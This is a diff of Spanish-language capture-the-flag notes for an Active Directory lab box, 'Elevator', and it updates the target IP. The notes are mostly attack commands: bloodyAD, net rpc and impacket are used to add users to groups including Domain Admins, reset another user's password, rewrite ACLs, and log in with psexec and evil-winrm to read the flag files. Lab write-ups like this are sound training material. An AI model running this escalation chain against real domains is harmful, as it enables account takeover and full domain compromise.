-└─ net rpc group addmem 'OPERACIONES' 'patricia.brown' -U 'bloodhound.thl/patricia.brown%Patito12345' -S elevator.bloodhound.thl
-                                                                                                                                                                                                                                                            
-└─ net rpc group addmem 'OPERACIONES' 'michael.jones' -U 'bloodhound.thl/patricia.brown%Patito12345' -S elevator.bloodhound.thl
+- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito12345' add groupMember OPERACIONES PATRICIA.BROWN
 
 
 
 
-## net rpc group delmem 'OPERACIONES' 'patricia.brown' -U 'bloodhound.thl/patricia.brown%Patito12345' -S elevator.bloodhound.thl
+## Aplicar cambios de contraseña
+
+bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito12345' set password MICHAEL.JONES admin12345
 
 
 
-## bloodyAD --host ELEVATOR.bloodhound.thl -d bloodhound.thl -u 'patricia.brown' -p 'Patito12345' add groupMember OPERACIONES patricia.brown
 
 
-roup:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
-group:[Administradores clave de la organización] rid:[0x20f]
-group:[DnsUpdateProxy] rid:[0x44e]
-group:[finanzas] rid:[0x456]
-group:[marketing] rid:[0x459]
-group:[operaciones] rid:[0x45b]
 
 
-rpcclient $> querygroupmem 0x45b
-        rid:[0x45a] attr:[0x7]
-
-rpcclient $> queryuser 0x45a
-        User Name   :   patricia.brown
-        Full Name   :   Patricia Brown
-        Home Drive  :
-        Dir Drive   :
+bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'MICHAEL.JONES' -p 'Patito12345' add groupMember 'Usuarios de administración remota' MICHAEL.JONES
 
 
-------------------------------------------------------------------------
+
+
+
+
 
 
 
 ### Vamos a cambiarle de contrasena al usuario michael.jones
 
-net rpc password "michael.jones" "Patito12345" -U "bloodhound.thl"/"patricia.brown"%"Patito12345" -S 192.168.56.105
+net rpc password "michael.jones" "Patito12345" -U "bloodhound.thl"/"patricia.brown"%"Patito12345" -S 192.168.56.4
 
 bloodyAD --host ELEVATOR.bloodhound.thl -d bloodhound.thl -u 'patricia.brown' -p 'Patito12345' set password michael.jones 'Patito12345'
 
-netexec smb 192.168.56.105 -u michael.jones -p 'Patito12345' 
+netexec smb 192.168.56.4 -u michael.jones -p 'Patito12345' 
 
 
 
 
-netexec winrm -i 192.168.56.105 -u patricia.brown -p 'Patito12345'
+netexec winrm -i 192.168.56.4 -u patricia.brown -p 'Patito12345'
 
 
 
-impacket-changepasswd bloodhound.thl/patricia.brown@192.168.56.105 -newpass Patito12345 -altuser  bloodhound.thl/michael.jones -altpass Password@1 -reset
+impacket-changepasswd bloodhound.thl/patricia.brown@192.168.56.4 -newpass Patito12345 -altuser  bloodhound.thl/michael.jones -altpass Password@1 -reset
                  
 
-impacket-changepasswd bloodhound.thl/michael.jones@192.168.56.105 -newpass 'Password@987' -p rpc-samr
+impacket-changepasswd bloodhound.thl/michael.jones@192.168.56.4 -newpass 'Password@987' -p rpc-samr
 
-bloodyAD --host "192.168.56.105" -d "bloodhound.thl" -u "patricia.brown" -p "Patito12345" add groupMember "Domain Admins" "patricia.brown"
-
-
-impacket-psexec patricia.brow:Patito12345@1@bloodhound.thl -dc-ip 192.168.56.105
+bloodyAD --host "192.168.56.4" -d "bloodhound.thl" -u "patricia.brown" -p "Patito12345" add groupMember "Domain Admins" "patricia.brown"
 
 
-impacket-dacledit -action 'write' -rights 'FullControl' -principal 'patricia.brown' -target 'michael.jones' 'bloodhound.thl/patricia.brown:Patito12345'
+impacket-psexec patricia.brow:Patito12345@1@bloodhound.thl -dc-ip 192.168.56.4
 
-------------------------------------------------------------------------
 
---wmi "SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'"
 
-------------------------------------------------------------------------
 
-------------------------------------------------------------------------
-------------------------------------------------------------------------
 
-------------------------------------------------------------------------
 
-------------------------------------------------------------------------
 
+
+
+
+
+
+Aplicar cambios de contraseña
+
+➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito12345' set password MICHAEL.JONES Patito12345
+[+] Password changed successfully!
+Date cuenta jones Agregar al grupo remoto
+
+➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'MICHAEL.JONES' -p 'Patito12345' add groupMember 'Usuarios de administración remota' MICHAEL.JONES
+[+] MICHAEL.JONES added to Usuarios de administración remota
+Uso evil-winrm Iniciar sesión
+
+imagen.png
+
+*Evil-WinRM* PS C:\Users\administrador\desktop> type root.txt
+axxxxxxxxxxxxxxxxxxxxxxxxxxx6
+*Evil-WinRM* PS C:\Users\administrador\desktop> type user.txt
+bxxxxxxxxxxxxxxxxxxxxxxxxxxxe
+Resume
+¿Genial?
